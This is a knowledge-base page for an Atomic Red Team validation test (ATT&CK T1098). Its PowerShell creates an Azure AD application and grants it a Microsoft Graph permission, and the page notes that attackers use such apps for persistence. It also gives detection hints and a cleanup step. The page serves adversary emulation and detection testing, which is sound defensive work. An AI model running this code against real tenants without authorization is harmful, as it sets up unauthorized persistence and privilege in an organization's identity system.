---
atomic_guid: "94ea9cc3-81f9-4111-8dde-3fb54f36af4b"
title: "Azure AD - adding permission to application"
framework: "atomic"
generated: "true"
attack_technique_id: "T1098"
attack_technique_name: "Account Manipulation"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "94ea9cc3-81f9-4111-8dde-3fb54f36af4b"
  - "Azure AD - adding permission to application"
platforms:
  - "azure-ad"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Azure AD - adding permission to application

The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.
This technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: "Get-AzureADApplication" instead of "New-AzureADServicePrincipal".
The DirectoryRecommendations.Read.All permissions has been selected as the default.

The account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.

Detection hint - check Operation Name "Add app role assignment to service principal" in subscriptions Activity Logs.
You can also take a look at the materials:
https://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/
https://github.com/reprise99/Sentinel-Queries
https://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766
https://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb

## Metadata

- Atomic GUID: 94ea9cc3-81f9-4111-8dde-3fb54f36af4b
- Technique: T1098: Account Manipulation
- Platforms: azure-ad
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1098/T1098.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1098-account_manipulation|T1098]]

## Input Arguments

### application_name

- description: Name of the targeted application that will be created
- type: string
- default: test_app

### application_permission

- description: Permission from Microsoft Graph Resource API that will be added to application
- type: string
- default: DirectoryRecommendations.Read.All

### password

- description: Azure AD password
- type: string
- default: p4sswd

### username

- description: Azure AD username
- type: string
- default: jonh@contoso.com

## Dependencies

AzureAD module must be installed.

### Prerequisite Check

```text
try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```

### Get Prerequisite

```text
Install-Module -Name AzureAD -Force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = New-AzureADApplication -DisplayName "#{application_name}"
$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId
#$aadApplication = Get-AzureADApplication -Filter "DisplayName eq '#{application_name}'"

#Get Service Principal of Microsoft Graph Resource API 
$graphSP = Get-AzureADServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"

#Initialize RequiredResourceAccess for Microsoft Graph Resource API 
$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$requiredGraphAccess.ResourceAppId = $graphSP.AppId
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]

#Set Application Permissions
$ApplicationPermissions = @('#{application_permission}')

$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}
if($reqPermission)
{
$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$resourceAccess.Type = "Role"
$resourceAccess.Id = $reqPermission.Id    
#Add required app permission
$requiredGraphAccess.ResourceAccess.Add($resourceAccess)
}
else
{
Write-Host "App permission $permission not found in the Graph Resource API" -ForegroundColor Red
}

#Add required resource accesses
$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]
$requiredResourcesAccess.Add($requiredGraphAccess)

#Set permissions in existing Azure AD App
Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess

$servicePrincipal = Get-AzureADServicePrincipal -Filter "AppId eq '$($aadApplication.AppId)'"

New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id
```

### Cleanup

```powershell
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = @(Get-AzureADApplication -Filter "DisplayName eq '#{application_name}'")
If ($aadApplication.Count -eq 0)
{
  Write-Host "App not found: cannot delete it"
  exit
}
ElseIf ($aadApplication.Count -gt 1)
{
  Write-Host "Found several app with name '#{application_name}': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required."
  exit
}
Else
{
  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId
  Write-Host "Successfully deleted app"
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.yaml)
